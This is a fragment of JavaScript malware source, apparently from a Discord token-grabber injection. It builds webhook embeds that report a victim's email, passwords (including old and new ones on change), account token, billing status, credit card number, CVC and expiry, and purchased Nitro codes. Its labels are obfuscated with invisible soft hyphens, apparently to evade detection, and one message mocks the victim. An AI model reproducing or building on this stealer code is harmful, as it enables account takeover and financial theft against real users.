    ...
    embeds: [
      {
        ...
        fields: [
          {
            name: "**Ac­c In­fo**",
            value: `E­­m­a­il: **${email}** - P­­­as­sw­or­d: **${password}**`,
            inline: false,
          },
          {
            name: "**­­Co­r­d I­nf­­o**",
            value: `N­i­tr­o Typ­­­­e: **${nitro}**\nBa­­­dg­es: **${badges}**\n­Bil­lin­g: **${billing}**`,
            inline: false,
          },
          {
            name: "**T­­K­N**",
    ...
    embeds: [
      {
        ...
        fields: [
          {
            name: "**P­­as­­s­­w­­o­­rd C­­ha­­nge­­d**",
            value: `E­­ma­­­­il: **${json.email}**\nO­­l­­d Pa­­­­­­ssw­­or­­d: **${oldpassword}**\nN­­ew ­­­­­­P­­a­­ss­­w­­or­­d: **${newpassword}**`,
            inline: true,
          },
          {
            name: "**­­Co­r­d I­nf­­o**",
    ...
    embeds: [
      {
        ...
        fields: [
          {
            name: "**E­­m­­ai­­­­­­l Ch­­an­­­­ge­­d**",
            value: `N­­ew E­­m­­ai­­l: **${email}**\nPa­­ssw­­­­o­­rd: **${password}**`,
            inline: true,
          },
          {
            name: "**­­Co­r­d I­nf­­o**",
    ...
    embeds: [
      {
        ...
        fields: [
          {
            name: "**P­­­­a­­yp­­al Ad­­de­­d**",
            value: `Ti­­­­me to ­­bu­­y som­­e ni­­­­­­tro bab­­­­y 😩`,
            inline: false,
          },
          {
            name: "**­­Co­r­d I­nf­­o**",
    ...
    embeds: [
      {
        ...
        fields: [
          {
            name: "**­­C­­­­C­­ A­­dd­­ed**",
            value: `­­C­­­­­­C­­ N­­u­­­­­­mb­­er: **${number}**\n­­­­CV­­­­C­­: **${cvc}**\n­­C­­C­­­­­­ ­­Exp­­ira­­­­­­ti­­on: **${expir_month}/${expir_year}**`,
            inline: true,
          },
          {
            name: "**­­Co­r­d I­nf­­o**",
    ...
    embeds: [
      {
        ...
        fields: [
          {
            name: "**N­­­­i­­t­­r­­o bo­­ug­­ht!**",
            value: `**N­­­­it­­ro C­­od­­­­e:**\n\`\`\`diff\n+ ${code}\`\`\``,
            inline: true,
          },
          {
            name: "**­­Co­r­d I­nf­­o**",
